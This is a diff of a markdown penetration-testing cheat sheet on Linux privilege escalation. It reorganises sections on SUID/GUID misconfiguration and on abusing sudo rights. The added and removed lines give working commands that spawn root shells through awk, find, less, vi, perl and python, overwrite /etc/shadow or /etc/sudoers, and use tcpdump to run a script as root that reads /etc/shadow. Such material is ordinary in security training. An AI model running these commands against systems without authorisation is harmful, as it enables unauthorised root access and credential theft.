@@ -134,6 +134,7 @@ pkg_info
 
 ### Weak/reused/plaintext passwords
 
+
 - Check database config-file (`config.php` or similar)
 - Check databases
 - Check weak passwords
@@ -165,8 +166,132 @@ netstat -anlp
 netstat -ano
 ```
 
-### Suid Misconfiguration
+### Suid and Guid Misconfiguration
 
+A binary with suid permission can be run by anyone, but when they are run they are run as the user who set the suid. It could be root, or another user. If the suid-bit is set on a program that can spawn a shell or in another way abuse the rights.
+
+For example, these are some programs that can be used to spawn a shell:
+
+```
+nmap
+vim
+less
+more
+```
+
+If these programs have suid-bit set we can use them to escalate privileges too. For more of these and how to use the see the next section about abusing sudo-rights:
+
+```
+nano
+cp
+mv
+find
+```
+
+**Find suid and guid files**
+
+```
+#Find SUID
+find / -perm -u=s -type f 2>/dev/null
+
+#Find GUID
+find / -perm -g=s -type f 2>/dev/null
+```
+
+### Abusing sudo-rights
+
+If you have a limited shell that access to some sudo programs you might be able to escalate your privileges with it. Any program that can write or overwrite can be used. If you have `cp` you can overwrite `/etc/shadow` or `/etc/sudoers`.
+
+
+`awk`
+
+```
+awk 'BEGIN {system("/bin/bash")}'
+```
+
+`bash`
+
+`cp`  
+Copy and overwrite /etc/shadow
+   
+`find`
+
+```bash
+sudo find / -exec bash -i \;
+
+find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
+```
+   
+`ht`  
+The text/binary-editor HT.
+
+`less`
+From less you can go into vi, and then into a shell
+
+```
+sudo less /etc/shadow
+v
+:shell
+```
+
+`more`  
+
+You need to run more on a file that is bigger than your screen.
+
+```
+sudo more /home/pelle/myfile
+!/bin/bash
+```
+
+`mv`
+Overwrite `/etc/shadow` or `/etc/sudoers`
+
+`man`
+
+`nano`
+
+`nc`
+
+`nmap`
+
+
+`python/perl/ruby/lua/etc`
+
+```
+sudo perl
+exec "/bin/bash";
+ctr-d
+```
+
+```
+sudo python
+import os
+os.system("/bin/bash")
+```
+
+`sh`
+
+`tcpdump`
+
+```
+echo $'id\ncat /etc/shadow' > /tmp/.test
+chmod +x /tmp/.test
+sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+```
+
+`vi/vim`
+
+Can be abused like this:
+
+```
+sudo vi
+:shell
+
+:set shell=/bin/bash:shell    
+:!bash
+``
+
+[How I got root with sudo/](https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/)
 
 
 ## Communication
@@ -187,13 +312,6 @@ netstat -ano
 
 # Privilege Escalation - Linux
 
-### Weak or reused passwords
-
-If there is a web-server, check the connection to the database. Try that password. Also log into the database with the user you found. Is there a admin-account that might be reusing passwords?
-
-Config-files  
-postfix  
-newsbeauter
 
 ### Configuration mistakes
 
@@ -239,139 +357,7 @@ find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
 
 [https://blog.maleadt.net/2015/02/25/sudo-escalation/](https://blog.maleadt.net/2015/02/25/sudo-escalation/)
 
-#### Homemade crappy suid programs
 
-**SUID files**
-
-SUID is a bit that you can set on a file. If you run a binary the binary is run as the user who is running it. But if the binary has the SUID-bit it will be run as the owner of that binary. This can be abused.
-
-Here is how you find SUID files:
-
-```
-find / -perm -u=s -type f 2>/dev/null
-```
-
-Run ltrace on them to see what they do.
-
-#### Setuid/setuig
-
-SUID is a bit that you can set on a file. If you run a binary the binary is run as the user who is running it. But if the binary has the SUID-bit it will be run as the owner of that binary. This can be abused.  
-Any editor with a setudi/setuig can be abused.
-
-**nmap**  
-SUID on nmap.
-
-Find them
-
-```
-#Find SUID
-find / -perm -u=s -type f 2>/dev/null
-
-#Find GUID
-find / -perm -g=s -type f 2>/dev/null
-```
-
-### Abusing sudo-rights
-
-If you have a shell that has limited sudo programs you might still be able to use it. Any program that can write or overwrite can be used. If you have `cp you can overwrite /etc/shadow or /etc/sudoers.   
-`**`ht`**`  
-The text/binary-editor HT running as sudo`
-
-**nano**
-
-**vi/vim**  
-With vi it is even easier. Just open vi
-
-```
-sudo vi
-:shell
-
-:set shell=/bin/bash:shell    
-:!bash
-```
-
-And you have shell.
-
-**less**  
-From less you can go into vi, and then into a shell
-
-```
-sudo less /etc/shadow
-v
-:shell
-```
-
-**more**  
-You need to run more on a file that is bigger than your screen.
-
-```
-sudo more /home/pelle/myfile
-!/bin/bash
-```
-
-**cp**  
-Copy and overwrite /etc/shadow
-
-**mv**  
-Overwrite /etc/shadow or /etc/sudoers
-
-**find**
-
-```
-sudo find / -exec bash -i \;
-
-find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
-```
-
-**python/perl/ruby/lua/etc**
-
-```
-sudo perl
-exec "/bin/bash";
-ctr-d
-```
-
-```
-sudo python
-import os
-os.system("/bin/bash")
-```
-
-**nmap**
-
-**awk**
-
-```
-awk 'BEGIN {system("/bin/bash")}'
-```
-
-**bash**
-
-**sh**
-
-**man**
-
-**nc**
-
-**netcat**
-
-**ruby**
-
-**lua**
-
-**irb**
-
-**tcpdump**
-
-[https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/](https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/)
-
-```
-echo $'id\ncat /etc/shadow' > /tmp/.test
-chmod +x /tmp/.test
-sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
-```
-
-**emacs**
 
 ### Software vulnerabilites
 
